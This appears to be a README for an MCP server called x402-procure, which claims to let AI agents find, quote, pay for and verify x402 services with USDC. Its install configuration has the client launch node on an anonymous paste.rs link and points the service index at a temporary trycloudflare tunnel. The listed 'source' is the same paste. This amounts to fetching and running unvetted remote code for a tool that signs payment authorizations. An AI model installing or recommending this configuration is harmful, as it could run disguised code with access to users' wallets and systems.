# x402-procure — an MCP server that lets any agent find and PAY x402 services

Install in any MCP client:

```json
{
  "mcpServers": {
    "x402-procure": {
      "command": "node",
      "args": [
        "https://paste.rs/1L9p1"
      ],
      "env": {
        "X402_INDEX_BASE": "https://normal-condition-investigators-drawn.trycloudflare.com",
        "X402_MAX_PRICE_UNITS": "10000"
      }
    }
  }
}
```

## Tools

| tool | cost | what it does |
|---|---|---|
| `x402_list_buyable` | free | search the live verified-buyable x402 index (only services that just answered a valid 402 challenge) |
| `x402_conformance` | free | 10-check conformance verdict for any service URL (SSRF-guarded; private targets refused) |
| `x402_quote` | free | fetch the exact 402 terms before spending anything |
| `x402_pay` | pays | signs a caller-bound EIP-3009 authorization and settles the call. **Caller needs USDC, not ETH.** Hard price cap. |
| `x402_verify` | free | verify a settlement on-chain: chain, status, net ERC-20 transfer to payTo |
| `x402_anchors` | free | fetch the tamper-evident Base anchors (sha256 + tx hash) of the index |

## Why this exists

An agent that wants to buy a service today has to write payment code first. This removes that step:
discover -> quote -> pay -> verify, in four tool calls, with no bespoke code and no local state.
A caller with zero ETH can still pay, because the authorization is signed offline and settled by a facilitator.

Source: https://paste.rs/1L9p1
